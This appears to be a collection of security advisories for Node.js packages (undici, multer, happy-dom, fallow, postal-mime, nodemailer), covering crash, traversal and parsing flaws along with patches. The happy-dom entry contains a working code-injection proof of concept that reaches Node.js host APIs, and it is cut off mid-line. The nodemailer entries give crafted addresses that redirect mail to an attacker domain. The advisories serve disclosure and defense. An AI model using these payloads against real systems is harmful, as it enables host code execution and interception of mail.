items.title: [undici] undici vulnerable to Denial of Service via unhandled error on excessive content-encodings
items.summary: Impactundici's fetch() crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled error and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the fetch() rejection. undici 6.x, 7.x, and 8.x are affected.PatchesUpgrade to 6.29.1, 7.30.1, or 8.12.2. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.WorkaroundsNone.Referenceshttps://github.com/nodejs/undici/security/advisories/GHSA-xjj6-f33q-929chttps://nvd.nist.gov/vuln/detail/CVE-2026-109869https://github.com/nodejs/undici/commit/07ded4941b1e72afec862958c3b8ddf468f3b429https://github.com/nodejs/undici/commit/1325a87dfb3492f8e87e6b0a84b3bda4e82e3436https://github.com/nodejs/undici/commit/b5084c7dc239172d75c336b1cd51ddac023938a5https://cna.openjsf.org/security-advisories.htmlhttps://github.com/nodejs/undici/releases/tag/v6.29.1https://github.com/nodejs/undici/releases/tag/v7.30.1https://github.com/nodejs/undici/releases/tag/v8.12.2https://github.com/advisories/GHSA-xjj6-f33q-929c

items.title: [undici] undici vulnerable to Denial of Service via unbounded memory in the EventSource parser
items.summary: Impactundici's EventSource client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed data: fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based maxEventSize and maxResponseSize limits do not bound that retained state, and maxResponseSize is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an EventSource connection to an untrusted peer, which controls only the response. Availability is the only impact.PatchesUpgrade to 6.29.1, 7.30.1, or 8.12.2, which bound the retained EventSource parser state (the number of data fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.WorkaroundsNone.Referenceshttps://github.com/nodejs/undici/security/advisories/GHSA-4qv8-2p9j-2685https://nvd.nist.gov/vuln/detail/CVE-2026-109924https://github.com/nodejs/undici/commit/299162740d5f39120092277e70efacb4d151c1c6https://github.com/nodejs/undici/commit/789ef26461c648480433846607154f52d74ec9abhttps://github.com/nodejs/undici/commit/c43b23fdc6b37e1283d4347408bb16800f867d9ehttps://cna.openjsf.org/security-advisories.htmlhttps://github.com/nodejs/undici/releases/tag/v6.29.1https://github.com/nodejs/undici/releases/tag/v7.30.1https://github.com/nodejs/undici/releases/tag/v8.12.2https://github.com/advisories/GHSA-4qv8-2p9j-2685

items.title: [undici] undici vulnerable to Subresource Integrity bypass via non-lowercase algorithm tokens
items.summary: Impactundici's fetch() verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as SHA256-... or Sha256-... is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.An application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.PatchesUpgrade to 7.30.1 or 8.12.2. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.WorkaroundsUse lowercase algorithm tokens (sha256, sha384, sha512) in integrity metadata.Referenceshttps://github.com/nodejs/undici/security/advisories/GHSA-f72v-6w45-q472https://nvd.nist.gov/vuln/detail/CVE-2026-109841https://github.com/nodejs/undici/commit/18bc8a1e09d15bc45815154a289dcf6fd5254d00https://github.com/nodejs/undici/commit/4f7ef6806e532ab9e29ccd6229b1b9d241e1b1f0https://cna.openjsf.org/security-advisories.htmlhttps://github.com/nodejs/undici/releases/tag/v7.30.1https://github.com/nodejs/undici/releases/tag/v8.12.2https://github.com/advisories/GHSA-f72v-6w45-q472

items.title: [multer] multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown
items.summary: ImpactWhen multer is configured with an asynchronous fileFilter, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async fileFilter is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled 'error' event, and the process exits. A single unauthenticated request is enough, so any application using multer with an asynchronous fileFilter is affected, regardless of storage engine. Uploads using a synchronous fileFilter are not affected.PatchesUsers should upgrade to multer 2.5.0 or later.WorkaroundsUse a synchronous fileFilter.Referenceshttps://github.com/expressjs/multer/security/advisories/GHSA-q7qp-rjg7-q26mhttps://nvd.nist.gov/vuln/detail/CVE-2026-113872https://github.com/expressjs/multer/commit/80a2d9df1dfd63b5fab631b8b9966164ed647adfhttps://cna.openjsf.org/security-advisories.htmlhttps://github.com/expressjs/multer/releases/tag/v2.5.0https://github.com/advisories/GHSA-q7qp-rjg7-q26m

items.title: [happy-dom] Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution
items.summary: SummaryThe ESM compiler in happy-dom@20.14.5 does not validate imported local binding aliases before interpolating them into generated JavaScript.As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates importName in the local export { ... } handler, but the named import handler still places an unvalidated alias directly into code context.These issues were confirmed through the public Window and <script type="module"> APIs using the published happy-dom npm package. The PoC reaches the Node.js host process, obtains node:fs, and creates a proof directory on the host filesystem.Confirmed affected versionsThe PoC was directly tested against:happy-dom@17.0.0happy-dom@20.0.0happy-dom@20.1.0happy-dom@20.14.5The same PoC does not trigger on happy-dom@16.8.1.The ESM compiler was introduced by commit 7bc831df2, first released in v17.0.0. The vulnerable interpolation remains present through v20.14.5, the latest release at the time of testing.Suggested affected range:>= 17.0.0, <= 20.14.5No patched version is currently available.PreconditionsJavaScript evaluation is enabled with enableJavaScriptEvaluation: true.Attacker-controlled HTML or module source is processed by Happy DOM.This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.Technical detailsIn packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts, the named import handler splits an import specifier and extracts its alias:const nameParts = part.trim().split(/\s+as\s+/);const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');const name = nameParts[0].replace(/["']/g, '');if (alias && name) {  properties.push({ name, alias });}Unlike the patched export { ... } handler, the value of alias is not validated as a JavaScript identifier.It is subsequently inserted directly into generated binding syntax:newCodeStart += `let {${properties  .map((property) =>    property.alias      ? `"${property.name}": ${property.alias}`      : property.name  )  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;Consider the following source:import {  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337} from './dep.json' with { type: 'json' };This is invalid ECMAScript module syntax. Node.js rejects it at the = token.Happy DOM instead transforms it into the equivalent of:let {  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337} = $happy_dom.imports.get('https://poc.local/dep.json');This generated JavaScript is valid. Because the imported JSON object does not contain a missing property, the default initializer executes.The with { type: 'json' } attribute is relevant because the compiler only generates its circular import resolver for ESM imports:if (!match[7] || match[7] === 'esm') {  resolvableCircularImports.push({ url, properties });}Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:globalThis.constructor.constructor(`return process`)()  .getBuiltinModule(`node:fs`)  .mkdirSync(    globalThis.constructor.constructor(`return process`)().cwd() +      `/HAPPY_DOM_RCE_PROOF`  )Proof of conceptThe following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named HAPPY_DOM_RCE_PROOF.1. Create package.json{  "name": "happy-dom-import-alias-rce-poc",  "private": true,  "type": "module",  "dependencies": {    "happy-dom": "20.14.5"  }}2. Create dep.json{}3. Create payload.mjsThis file is used as a control to demonstrate that a native ECMAScript parser rejects the source:import {  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337} from './dep.json' with { type: 'json' };4. Create poc.mjsimport { Window } from 'happy-dom';import { existsSync, rmSync } from 'node:fs';import { resolve } from 'node:path';const proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');rmSync(proofDirectory, { recursive: true, force: true });const window = new Window({  url: 'https://poc.local/',  settings: {    enableJavaScriptEvaluation: true,    suppressCodeGenerationFromStringsWarning: true,    fetch: {      virtualServers: [        {          url: 'https://poc.local/',          directory: process.cwd()        }      ]    }  }});const script = window.document.createElement('script');script.type = 'module';script.textContent = `  import {    missing as injected = globalThis.constructor.constructor(\`return process\`)()      .getBuiltinModule(\`node:fs\`)      .mkdirSync(        globalThis.constructor.constructor(\`return process\`)().cwd() +        \`/HAPPY_DOM_RCE_PROOF\`      )  } from './dep.json' with { type: 'json' };`;window.do

items.title: [fallow] Fallow: A `.*` glob segment let an analyzed repository make Fallow test paths in the parent of the project root
items.summary: ImpactFallow expands some globs from the analyzed repository on disk. Before 3.34.0, a segment such as .*, .? or ..* in such a glob also matched the special .. entry. The glob crate tests .. against a segment that starts with a literal .. Fallow validates plugin glob patterns and refuses absolute paths and .. segments, but these segments passed that validation.The attacker controls the repository content. The attacker must also be able to read the Fallow output, for example a CI log or a pull request comment. Then the attacker can learn if a file or directory exists in the parent of the project root:A plugin fileExists detection pattern such as .*/marker.json made the plugin active when marker.json existed in the parent directory.An external plugin configPatterns or alwaysUsed pattern could match a config file in the parent directory. When the plugin was active and declared toolingDependencies, the tooling detection credited the related dev dependency. An unused dependency finding could then disappear, and --trace-dependency printed the outside path.fallow plugin-check reported path_exists: true for a seeded entry that matched only in the parent directory.Fallow tested only that these paths exist. It did not read or print the content of a file outside the project root through these globs.The Jest, Vitest and Rstest project globs had the same .* problem, and the Jest and Vitest ones also read file content. GHSA-jfwm-3p3c-6hx5 describes that case.PatchesFixed in 3.34.0. Fallow now rewrites a leading . in a wildcard segment to [.] before it expands the glob on disk. [.] matches the same hidden files and directories inside the project root. The glob crate does not test .. against it.WorkaroundsRun Fallow only on repositories that you trust. Before you run Fallow on another repository, check the detection, configPatterns and alwaysUsed patterns of its plugin files.Referenceshttps://github.com/fallow-rs/fallow/security/advisories/GHSA-h4fr-cmh5-qr62https://github.com/fallow-rs/fallow/pull/3548https://github.com/fallow-rs/fallow/commit/133d4c862c74f4b1f0a7417c65b7157c1144294dhttps://github.com/fallow-rs/fallow/releases/tag/v3.34.0https://github.com/advisories/GHSA-h4fr-cmh5-qr62

items.title: [fallow] Fallow: Jest and Vitest `projects` entries let an analyzed repository make Fallow read files outside the project root
items.summary: ImpactFallow reads the Jest and Vitest configs of the repository that it analyzes. A Jest projects entry or a Vitest test.projects entry can name a path. Fallow followed such an entry to a config file and read that file, also when the file was outside the project root. These forms reached outside the root:an absolute path or glob, for example /etc/*;a path with .. segments, for example ../*;a glob with a .* segment, because the glob crate also tests .. against a segment that starts with a literal .;a symlink in the project root to a directory above it;the extends path of a Vitest inline project;a script --config path that is a symlink to a file outside the project root.Fallow parsed each of these files as a test runner config. Fallow used the content only to credit dependencies, setup files and JSX import sources. Thus unused dependency and unused file findings could change. Fallow did not print the content or send it over the network.The Fallow threat model states that analysis reads only inside the project root. A crafted repository could make Fallow read files that the user did not expect. Such a read can happen in CI, or when an agent runs Fallow on a cloned repository. The attacker gets changed findings, not the file content.Versions 2.68.0 to 3.33.1 read outside files through Jest projects. Version 3.33.1 also read them through Vitest test.projects.PatchesFixed in 3.34.0. Fallow now resolves each match with symlinks and .. segments removed. Fallow reads the match only when it is inside the project root. A glob whose literal base is outside the project root does not run. The boundary is the project root, so an in-root entry such as <rootDir>/../packages/* still works, also from the config of a workspace package. Fallow also does not read a script --config path that is a symlink to a file outside the project root.WorkaroundsRun Fallow only on repositories that you trust. Before you run Fallow on another repository, check the projects entries of its jest.config.* and vitest.config.* files.Referenceshttps://github.com/fallow-rs/fallow/security/advisories/GHSA-jfwm-3p3c-6hx5https://nvd.nist.gov/vuln/detail/CVE-2026-115569https://github.com/fallow-rs/fallow/pull/3556https://github.com/fallow-rs/fallow/commit/75c0c60948a53ddfe042e65b446343989f4c5649https://github.com/fallow-rs/fallow/releases/tag/v3.34.0https://github.com/advisories/GHSA-jfwm-3p3c-6hx5

items.title: [postal-mime] postal-mime: Quadratic CPU consumption when decoding a header of many joinable RFC 2047 base64 encoded words
items.summary: ImpactDecoding a header that holds a long run of joinable RFC 2047 base64 encoded words, such as =?utf-8?B?QUJD?= repeated tens of thousands of times in a Subject, From, To, a filename or a description, took time quadratic in the number of words. The join check ran a regex over the text joined so far for every word, which flattens the accumulated string each time. A single well formed message of about 1.6 MB blocked the event loop for one to twenty seconds depending on the host, and inline message/rfc822 parts multiplied the cost, since each nested message carried its own header budget.Any application that parses untrusted mail with postal-mime 3.0.0 through 4.0.7, including the exported decodeWords() helper, is affected. There is no confidentiality or integrity impact.PatchesFixed in 4.0.8. The pad check now tracks the last appended word instead of testing the joined text, so decoding is linear in the header length. The same release also counts the parts and header bytes of inline message/rfc822 sub-messages against the limits of the message as a whole, counts every header line for at least 64 bytes of maxHeadersSize, and adds a scaling test that measures every stage of the parser at two input sizes.WorkaroundsLower maxHeadersSize from its 2 MiB default to bound the cost per message, or parse untrusted mail in a worker that can be terminated.CreditsReported by Felipe Fernández.Referenceshttps://github.com/postalsys/postal-mime/security/advisories/GHSA-f2hq-32vh-53cchttps://github.com/postalsys/postal-mime/commit/9eb25a66bb3cc8b631421be651b9648796f19136https://github.com/postalsys/postal-mime/releases/tag/v4.0.8https://github.com/advisories/GHSA-f2hq-32vh-53cc

items.title: [nodemailer] Nodemailer: A nested comment ends early in addressparser, releasing the rest of the comment as a recipient
items.summary: Vulnerability summaryRFC 5322 comments nest. addressparser ended a comment at the first ), including the one that closes a nested comment, and parsed the rest of the outer comment as header text. Victim (x(y) <evil@evil.com>) <v@victim.com> names v@victim.com with x(y) <evil@evil.com> as a comment, and Nodemailer read it as the address evil@evil.com. This is the same shape as the escaped parenthesis fixed in 10.1.2, reached through nesting instead of a quoted-pair. Affected: 3.0.0 through 10.1.3.Attacker capabilitiesThe attacker controls the text of an address that an application passes to Nodemailer, or the From or To header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.Realistic exploitation scenarioAn application validates a submitted address with a conformant parser and allows only its own domain. The attacker submits Victim (x(y) <evil@evil.com>) <v@victim.com>, which validates as v@victim.com. Nodemailer delivers to evil@evil.com. In the inbound direction, a DMARC or display layer built on a conformant parser and a mail client built on mailparser disagree on the author of the same message, which is the setting for sender spoofing. The boundary crossed is the application's recipient allow list, or the author check of the receiving side.Proof of conceptconst addressparser = require('nodemailer/lib/addressparser');console.log(addressparser("Victim (x(y) <evil@evil.com>) <v@victim.com>"));// [ { address: 'evil@evil.com', name: 'Victim) v@victim.com' } ]Python's email._header_value_parser.get_address_list reads the same value as v@victim.com with the display name Victim, with no defects reported.The envelope a message gets is built from the same parse, so sendMail({ to: "Victim (x(y) <evil@evil.com>) <v@victim.com>" }) issues the RCPT TO shown above.Security impactMail intended for an approved recipient is delivered to an attacker chosen domain, disclosing its content, and parsers built on this module report a different author than conformant ones. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.The fix counts comment depth and ends a comment only at the ) that closes the outermost one.Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.Referenceshttps://github.com/nodemailer/nodemailer/security/advisories/GHSA-8c8m-p3m8-cjg8https://github.com/nodemailer/nodemailer/commit/0a8761762ac78f2db2ba37f712f2a52a404ce011https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4https://github.com/advisories/GHSA-8c8m-p3m8-cjg8

items.title: [nodemailer] Nodemailer: A ";" inside a quoted string or comment ends an address group early in addressparser, turning display text into a recipient
items.summary: Vulnerability summaryaddressparser ends an RFC 5322 group at the first ;, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. G: (a; <evil@evil.com>) <v@victim.com>; names only v@victim.com, and Nodemailer read it as the single recipient evil@evil.com. Affected: 3.0.0 through 10.1.3.Attacker capabilitiesThe attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.Realistic exploitation scenarioAn application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits G: (a; <evil@evil.com>) <v@victim.com>;. The validator sees one mailbox, v@victim.com, and approves it. Nodemailer delivers to evil@evil.com only. The same works through a quoted display name, G: "a;" "<evil@evil.com>" <v@victim.com>;. The boundary crossed is the application's recipient allow list.Proof of conceptconst addressparser = require('nodemailer/lib/addressparser');console.log(addressparser("G: (a; <evil@evil.com>) <v@victim.com>;"));// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]Python's email._header_value_parser.get_address_list reads the same value as the single mailbox v@victim.com, with no defects reported.The envelope a message gets is built from the same parse, so sendMail({ to: "G: (a; <evil@evil.com>) <v@victim.com>;" }) issues the RCPT TO shown above.Security impactMail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.The fix tracks quoted strings and comments inside a group and reads only a ; outside them.Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.Referenceshttps://github.com/nodemailer/nodemailer/security/advisories/GHSA-m943-m63m-w62whttps://github.com/nodemailer/nodemailer/commit/1cd57d2b8c49dff048c21cdbafdb54439a7f07e2https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4https://github.com/advisories/GHSA-m943-m63m-w62w

items.title: [nodemailer] Nodemailer: A ">" inside a quoted local part ends an angle-addr early in addressparser, delivering to a domain the header does not name
items.summary: Vulnerability summaryaddressparser ends an angle-addr at the first > it sees, including one inside a quoted local part, a comment or a domain literal. The domain is then read off the text in front of that >. <"a@evil.com>"@good.com> is the mailbox "a@evil.com>"@good.com under RFC 5322, and Nodemailer read it as an address at evil.com. The unbracketed spelling of the same value was already read correctly. Affected: 3.0.0 through 10.1.3.Attacker capabilitiesThe attacker controls the text of a recipient or sender address that an application passes to Nodemailer, for example a To value entered in a contact or invite form, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.Realistic exploitation scenarioAn application lets users send invitations or notifications only to addresses at an allowed domain and validates the submitted value with a conformant parser or by checking its domain. The attacker submits <"a@evil.com>"@good.com>, which validates as a good.com mailbox. Nodemailer then parses the same value, issues RCPT TO:<"\"a"@evil.com> and the message, with whatever content the application puts into it, is delivered to the attacker's domain. The security boundary crossed is the application's recipient allow list. In the inbound direction, mailparser reports a different address than a conformant reader of the same header, so a display or policy layer built on the two disagrees.Proof of conceptconst addressparser = require('nodemailer/lib/addressparser');console.log(addressparser("<\"a@evil.com>\"@good.com>"));// [ { address: '"a@evil.com', name: '@good.com>' } ]Python's email._header_value_parser.get_address_list reads the same value as "a@evil.com>"@good.com, with no defects reported.The envelope a message gets is built from the same parse, so sendMail({ to: "<\"a@evil.com>\"@good.com>" }) issues the RCPT TO shown above.Security impactMail that an application intends for an allowed domain is delivered to a domain chosen by the attacker, which discloses its content. It is a security vulnerability rather than a parsing bug because the misreading only occurs for values that a conformant validator approves, so validation done the right way is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.The fix tracks quoted strings, comments and domain literals inside an angle-addr and reads only a > outside them.Found in an internal review of addressparser on 2026-10-18.
